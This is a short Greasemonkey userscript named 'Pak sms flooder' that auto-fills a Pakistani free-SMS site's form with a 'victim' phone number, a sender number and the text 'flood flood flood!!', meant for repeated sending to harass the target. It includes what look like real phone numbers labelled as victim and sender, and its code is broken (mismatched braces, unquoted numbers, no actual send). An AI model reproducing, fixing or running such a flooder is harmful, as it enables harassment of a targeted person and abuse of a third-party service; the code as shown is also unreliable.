// ==UserScript==
// @name          Pak sms flooder
// @namespace     Umer Dhamria
// @description   flooder sms
// @include       http://*www.*she*.com.*pk
// ==/UserScript==

var victim=03229730978; //Enter victims number here
var sender=03218297212; //Enter victims number here
var delay=121000; // Enter delay in milliseconds if required


if(document.location=="http://www.she.com.pk/sms/sms.php")
{
document.freesms.TO.value=victim;
document.freesms.Your.value=sender;
document.freesms.MSG.value='flood flood flood!!';
{
else 
{
alert('check data');
}
}